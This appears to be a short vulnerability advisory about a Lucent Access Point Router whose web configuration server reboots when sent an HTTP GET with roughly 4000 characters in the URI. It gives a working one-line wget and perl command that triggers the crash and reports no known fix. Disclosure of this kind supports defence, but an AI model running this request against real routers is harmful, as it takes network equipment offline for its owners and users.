[ Overview ]
	The Lucent Access Point Router is a mid-range Access Level Router
	that supports a wide range of cool features such as CBQ (QoS stuff).
	
[ Description ]
	The Lucent Access Point has a web server providing a colorful
	interface to use for configuration.  This interface is apparently 
	for those people who don't like the extremley powerful 
	command-line. When sending an HTTP GET request with approximately
	4000 characters in the URI to the server, the Access Point reboots.

[ Example ]
	linux# wget `perl -e 'print "http://router_ip/"; print "A"x4000; print "/";`
	router# [b00m]

[ Solution ]

	None known at this time.
